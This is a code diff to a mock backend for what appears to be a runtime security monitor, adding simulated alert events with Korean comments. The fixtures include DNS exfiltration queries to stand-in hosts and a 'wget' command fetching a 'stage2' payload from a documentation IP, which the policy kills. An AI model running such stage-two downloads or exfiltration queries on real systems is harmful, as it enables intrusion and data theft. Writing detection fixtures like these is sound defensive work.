@@ -546,6 +546,8 @@ export class MockBackend {
         () => alert(e({ kind: 'dns', comm: 'python3', dstHost: DNS_EXFIL_NAME, qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
         () => alert(e({ kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
       ],
+      benign: [], // 11/04: 정상 대조군 — 위반 없음
+      chain: [() => kill(e({ kind: 'exec', comm: 'wget', args: 'wget -q -O /dev/null http://203.0.113.7/stage2' }), 'no-shell-download', '외부 다운로드 도구 실행')], // 11/04: 기본 정책은 1단계에서 격리
       all: [],
     };
     V.all = [...V.shell, ...V.revshell, ...V['direct-ip'], ...V.domain, ...V['dns-exfil']];
